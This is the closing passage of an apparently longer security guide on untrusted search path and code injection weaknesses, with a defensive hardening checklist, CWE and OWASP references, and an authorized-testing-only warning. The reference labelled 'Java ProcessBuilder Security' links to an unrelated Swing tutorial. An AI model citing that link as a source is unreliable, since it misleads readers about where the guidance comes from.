- [ ] Use allow-lists for executables
- [ ] Enable AppArmor/SELinux profiles
- [ ] Set up process monitoring and logging
- [ ] Implement rate limiting on API calls
- [ ] Use environment whitelisting (limited PATH variable)

---

## RESOURCES & REFERENCES

- **CWE-426:** Untrusted Search Path - https://cwe.mitre.org/data/definitions/426.html
- **CWE-427:** Uncontrolled Search Path Element - https://cwe.mitre.org/data/definitions/427.html
- **OWASP:** Code Injection - https://owasp.org/www-community/Code_Injection
- **Java ProcessBuilder Security:** https://docs.oracle.com/javase/tutorial/uiswing/misc/index.html

---

**Document Version:** 1.0  
**Last Updated:** February 24, 2026  
**Classification:** Educational - For Authorized Security Testing Only

⚠️ **WARNING:** These techniques should only be used on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.
